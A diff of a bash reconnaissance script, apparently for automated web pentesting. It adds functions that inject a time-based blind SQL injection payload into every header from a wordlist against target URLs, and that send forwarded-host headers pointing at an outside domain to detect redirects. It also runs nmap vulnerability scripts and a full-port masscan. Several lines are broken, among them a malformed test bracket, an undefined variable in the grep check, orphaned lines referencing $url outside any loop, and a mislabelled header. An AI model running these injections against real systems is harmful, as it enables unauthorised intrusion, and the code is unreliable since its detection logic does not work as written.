@@ -169,17 +169,15 @@ subdomains(){
 	touch 7nmapvuln$1.txt
 	
 	echo -e "\e[32m\nDoing Curl to check headers...\033[0m"
-	echo "******** Checking headers for sqli... *********" > 9httprobeXORsqli$1.txt
-	cat 6httprobe$1.txt | while read url; do
-		cat ~/tools/__diccionarios/headers.txt | while read head; do
-			echo "\r\n*** URL: $url - Header: $head\r\n" >> 9httprobeXORsqli$1.txt
-			curl -X GET -H 'User-Agent:' -H "$head: \"XOR(if(now()=sysdate(),sleep(6),0))OR\"" -s -I -L -w "REQUESTTIME:%{time_starttransfer}\r\n" $url >> 9httprobeXORsqli$1.txt < /dev/null 2>&1
-		done
+	echo "******** Checking headers for sqli... *********" | tee 9httprobeXORsqli$1.txt
+	checkheadersforsqli 6httprobe$1.txt 9httprobeXORsqli$1.txt
+
+	echo "****** Checking headers for redirect... *******" | tee -a 9httprobeXORsqli$1.txt
+	checkheadersforredirect 6httprobe$1.txt 9httprobeXORsqli$1.txt
 		echo "\r\n*** URL: $url - Header: X-Forwarded-For: estebancano.com.ar/abc.php?$url\r\n" >> 9httprobeXORsqli$1.txt
 		curl -X GET -H "X-Forwarded-For: estebancano.com.ar/abc.php?$url" -s -I -L $url >> 9httprobeXORsqli$1.txt < /dev/null 2>&1
 		echo "\r\n*** URL: $url - Header: X-Forwarded-Host: estebancano.com.ar/abc.php?$url\r\n" >> 9httprobeXORsqli$1.txt
 		curl -X GET -H "X-Forwarded-Host: estebancano.com.ar/abc.php?$url" -s -I -L $url >> 9httprobeXORsqli$1.txt < /dev/null 2>&1
-	done
 	
 	echo -e "\e[32m\nDoing Nmap to check if alive...\033[0m"
 	nmap -sP -Pn -T5 -iL 1scrap$1.txt > 3nmap$1.txt < /dev/null 2>&1
@@ -189,19 +187,48 @@ subdomains(){
 	echo -e "\e[32m********** Starting Port scanning... **********\033[0m"
 	if [[ -f 4nmapips$1.txt && -s 4nmapips$1.txt ]]
 	then
-		echo -e "\e[32mDoing Nmap to check for top 2000 port vulns...\033[0m"
-		nmap -sS -Pn -T5 --data-length 35 --top-ports 2000 --script "vuln" -iL 4nmapips$1.txt > 7nmapvuln$1.txt < /dev/null 2>&1
+		echo -e "\e[32mDoing Nmap to check top 2000 port vulns/versions...\033[0m"
+		nmap -sS -Pn -T5 --data-length 35 --top-ports 2000 --script "vuln,version" -iL 4nmapips$1.txt > 7nmapvuln$1.txt < /dev/null 2>&1
 	fi
 	echo -e "\e[32mDoing Masscan...\033[0m"
 	masscan -p1-65535 -iL 4nmapips$1.txt -oG 5masscan$1.txt > /dev/null 2>&1
 	echo -e "\e[32m************* Port scanning done... ***********\033[0m"
 	
 	echo -e "\e[32m***************** Final results ***************\033[0m"
-	cat 8massdnssimple$1.txt 5masscan$1.txt 7nmapvuln$1.txt
+	cat 8massdnssimple$1.txt 5masscan$1.txt 7nmapvuln$1.txt 9httprobeXORsqli$1.txt
 	echo -e "\e[32m***********************************************\033[0m"
 	end=$(date +"%s")
 	diff=$(($end-$begin))
 	echo "$(($diff / 60))m $(($diff % 60))s elapsed."
+}
+
+# Gets an url with curl and adds every header to check for potential sqli injections (if response time > 6 seconds)
+# usage: checkheadersforsqli urllist.txt outputheaderswithsqli.txt
+# output: list of urls and headers with potential sqli
+checkheadersforsqli(){
+	cat $1 | while read url; do
+		cat ~/tools/__diccionarios/headers.txt | while read head; do
+			response=$(curl -X GET -H 'User-Agent:' -H "$head: \"XOR(if(now()=sysdate(),sleep(6),0))OR\"" -s -I -L -w "REQUESTTIME %{time_starttransfer}" $url)
+			time=$(echo $response | tail -1)
+			if [$time -gt 6]
+			then
+				echo "\r\n*** URL: $url - Header: $head\r\n" >> $2
+				echo $response >> $2
+			fi
+		done
+	done
+}
+
+# Gets an url with curl and adds every header to check for sqli injections (if response time > 6 seconds)
+# usage: checkheadersforredirect urllist.txt outputurlswithredirection.txt
+# output: list of urls and headers with redirection
+checkheadersforredirect(){
+	cat $1 | while read url; do
+		response=$(curl -X GET -H "X-Forwarded-For: estebancano.com.ar/abc.php?$url" -s -L $url)
+		grep -q '<!-- CHECK -->' <<< $var && echo "\r\n*** URL: $url - Header: X-Forwarded-For: estebancano.com.ar/abc.php?$url" >> $2
+		response=$(curl -X GET -H "X-Forwarded-Host: estebancano.com.ar/abc.php?$url" -s -L $url)
+		grep -q '<!-- CHECK -->' <<< $var && echo "\r\n*** URL: $url - Header: X-Forwarded-For: estebancano.com.ar/abc.php?$url" >> $2
+	done
 }
 
 getips(){
